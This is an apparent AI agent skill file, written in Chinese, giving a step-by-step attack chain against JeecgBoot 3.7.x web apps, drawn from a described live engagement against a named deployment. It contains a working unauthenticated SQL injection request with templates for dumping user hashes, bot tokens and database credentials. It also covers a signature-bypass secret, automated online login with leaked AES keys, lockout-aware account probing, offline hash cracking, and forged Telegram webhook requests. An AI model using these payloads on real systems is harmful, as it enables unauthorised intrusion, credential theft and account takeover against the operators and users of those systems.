---
name: jeecgboot-attack-chain
description: "Use when pentesting JeecgBoot apps: unauth SQLi chain."
version: 1.0.0
tags: [security, pentest, jeecg, jeecgboot, sqli]
---

# JeecgBoot 攻击链（3.7.x 实测）

来源: 2026-10 youyoulai/folktec tgbot-manage (JeecgBoot 3.7.1) 实战。识别: `/jeecg-boot/*` API + `sys/randomImage/{key}` 验证码 + `sys/login`。

## 1. 未授权 SQL 注入（核心, 实测有效）
```
POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData
Content-Type: application/json

{"tableName":"sys_user","compName":"test","condition":{"filter":{}},
 "config":{"assistValue":[],"assistType":[],
   "name":[{"fieldName":"<任意子查询表达式>","fieldType":"string"},
           {"fieldName":"id","fieldType":"string"}],
   "value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}
```
- `fieldName` 可为 `(SELECT ...)` 任意表达式 → 全库读取（无需登录）。
- 抽取模板: `(SELECT GROUP_CONCAT(concat(username,0x7c,password,0x7c,salt) SEPARATOR 0x0a) FROM sys_user)`
- GROUP_CONCAT 默认 1024 截断 → 分页 LIMIT offset 逐条取。
- 只读（无堆叠，不能写）。文件面实测口径：先 `SELECT @@secure_file_priv`（常见 `/var/lib/mysql-files/` → 仅该目录可 LOAD_FILE，`/etc/passwd` 等返回 NULL）；同查 `information_schema.schemata` 枚举同实例其它库（多库共实例时可跨库 `db.table` 读；本例单库 tgbot，无横向）。
- 高价值表: sys_user(哈希+盐), telegram_bot_config(token/secret_token), sys_log, sys_data_source / jimu_report_data_source(库凭据, 有时明文), sys_third_app_config。
- 白名单边界（实测）: drag 模块**只有 getTotalData 免鉴权**；同族 save/testConnection/queryFieldBySql/loadTableData 及全部 /jmreport/* = 401 "Token失效"——不要逐端点试探写面。
- **jmreport 链 = redis 硬门槛**: /jmreport/* token 走 TokenUtils.verifyToken → 要求 `prefix_user_token:<token>` 在 redis 中存在（getUsername 只 decode 不验签，但 verifyToken 以 redis 缓存为准）→ 即使签名密钥正确、JWT 伪造成功也过不去。无 redis 通道即放弃该链。

## 2. 签名拦截器绕过（前端泄露默认密钥）
- 前端 JS 常量（jeecg 默认 signatureSecret）: `dd05f1c54d63749eda95f9fa6d49v442a`
- 请求头: `X-TIMESTAMP`(ms), `X-Sign`, `X-Version: v3`, `X-Tenant-Id`。
- 算法: `upper(md5(JSON(排序后全参) + secret))`；参数=URL+body 合并(去 _t)。
- 实测: 未签名 → "Sign签名校验失败，时间戳为空"；签名后直达 handler。默认保护 /sys/sms、/sys/sendChangePwdSms 等。

## 3. 登录/注册面
- `/sys/mLogin`: 手机号登录, **无图形验证码**（/sys/login 需验证码）。
- `/sys/sms` + `/sys/phoneLogin` + `/sys/user/register`: 依赖短信码 redis `phone_msg<phone>`；SMS 未配置时 ClientException → redis 永不写 → 整链死。register 无需签名/登录。
- 验证码 `/sys/randomImage/{key}`: ddddocr 可解；checkCaptcha 读 redis[md5(code+key)]。
- **在线登录自动化（3.7.1）**: 密码字段 = AES-CBC/PKCS7 → base64，key=`1234567890adbcde` iv=`1234567890hjlkew`（EncryptedString.java 常量）；kaptcha 用 ddddocr 秒解。可全自动在线试（锁定: 失败约 5 次/10 分钟/用户名）。
- **del_flag 陷阱（重要）**: del_flag=1 的账号登录返回 "该用户不存在，请注册"（≠密码错误）。爆破/破解前先列 `username,del_flag,status`——曾 8 用户仅 2 存活，破出的弱密码属已删账号=无效（ceshi:123456 空欢喜）。在线探活: "用户名或密码错误"=账号存在；"该用户不存在"=已删/停用。
- 多租户: 登录需 `X-Tenant-Id` 头；sys_tenant 常见 1000/1001。

## 4. 会话/JWT
- JWT = HS256, secret = user.getPassword()（sys_user.password 字段, 有库即可自签）；**但 ShiroRealm 另查 redis `prefix_user_token:<token>` → 伪造被拦**（除非能写 redis）。
- QR 登录: `/sys/getLoginQrcode` 匿名；`/sys/scanLoginQrcode` 需认证；`/sys/getQrcodeToken` 匿名轮询。
- Shiro rememberMe: 发任意 cookie 看 deleteMe 反射；常用 key 集合时间盲测。

## 5. 密码格式与破解
- 存储: `PBEWithMD5AndDES(明文=username, key=password, salt, 1000轮)` → hex(16/32位)。
- KDF: T1=MD5(pwd||salt); T_{i}=MD5(T_{i-1}) ×1000; key=T[0:8], iv=T[8:16]; DES-CBC/PKCS5(plaintext=username)。
- 高速破解: C + OpenSSL(MD5+DES) 8 线程 ≈ 1.2 万词/秒；Python 慢 8-10 倍。拿到哈希后走离线破解（无频率限制）——live `/sys/login` 带图形验证码、无速度优势，不要 live 长喷。
- **破解器审计（先自证再下全灭结论）**: (1) 用 Java 跑 PasswordUtil.encrypt 生成测试向量，与 C/Python 实现逐字节对照（一致才敢信 0 命中）；(2) 审计 worker 循环上限与用户数组边界（曾有 `u < 2` 未随用户表扩容，8 用户实际只测 2 个）；(3) 词表常含非 UTF-8 字节 → `open(path, encoding='utf-8', errors='ignore')`（曾因 UnicodeDecodeError 崩批）。
- oConvertUtils.isNotEmpty 显式排除 "null" 字符串 → redis null 值绕不过。

## 6. 匿名面全图与重置链（2026-10 补充实测）

- **权威白名单 = ShiroConfig.java**：拿目标同版源码（GitHub jeecg-boot v3.7.1）对照实测。anon 清单：`/sys/randomImage/**` `/sys/checkCaptcha` `/sys/smsCheckCaptcha` `/sys/getEncryptedString` `/sys/sms` `/sys/phoneLogin` `/sys/mLogin` `/sys/user/checkOnlyUser` `/sys/user/register` `/sys/user/phoneVerification` `/sys/user/passwordChange` `/sys/getLoginQrcode` `/sys/getQrcodeToken` `/druid/**` `/drag/*`(多个) `/jmreport/**` `/websocket/**` `/openapi/call/**` `/test/**` `/WW_verify*`。
  - **`/sys/getEncryptedString` 匿名直出密码加密链 AES key/iv**（实测 `{"key":"1234567890adbcde","iv":"1234567890hjlkew"}`）——在线登录链可即时复刻。
  - `/sys/user/checkOnlyUser?username=x` = 匿名用户枚举；`phoneVerification` 成功返回 {username,smscode} = 手机号→账号反查。
- **忘记密码链（完整解剖·典型死路）**：`/sys/sms`(smsmode=2) → redis `phone_msg<phone>` 写 JSON `{code,username}` → `phoneVerification`(全等比对) → `passwordChange`(GET，username+password+smscode+phone)。三道锁：①短信未配置=ClientException→redis 永不写 ②码只到手机 ③第一步后 redis 被覆写成你提交的 smscode（后续只比这个）。issues/8567 修复后 passwordChange 同校 username+phone 对（水平越权已堵）。**唯一活门=第一步拿到短信码**，拿不到即弃。
- **静态 anon 面穿越死**：`/sys/common/static/**`、`/sys/common/pdf/**` 匿名但不可穿越——`..%2f`→400(WAF)、多级 `../` 被代理规范化成全路径→落应用鉴权(401)。
- **镜像站伪装**：同一套 jeecg 常以第二域名暴露（webhook host 常见，如 api-xxx.folktec.com 与主域同库同 SQLi）。逐域对照防护策略——镜像上 SQLi/anon 面照测，rules 可能不同。
- **TG webhook 接收器**：`POST /jeecg-boot/telegram/{botId}/webhook` + 头 `X-Telegram-Bot-Api-Secret-Token: <secret_token>` → 200 被当真实 update 处理；无 secret → 401。secret_token 在 `telegram_bot_config`/`tg_bot_config` 表（SQLi 可读）。验证只用不存在的 chat_id（零影响）；同族 `/telegram/*` 其余全 401。

## 7. 其它
- Druid 默认口令常被改；/actuator 默认只开 health；swagger 常 401。
- jimureport: 发布模式拦在线配置；数据源注册日志（暴露的 syslog）可泄 MySQL root 明文口令——但 3306 通常仅本机+边缘防火墙（filtered），存档待网络立足点再用。
- 利用顺序: SQLi 全库读 → 用户哈希/数据源凭据/bot token → sign 绕过 → mLogin → （哈希+redis 可写时）JWT 伪造。

脚本参考: /root/34.117.37.133_pentest/scripts/jeecg_*.py（sqli/dump/sign/qr/crack 工具链）
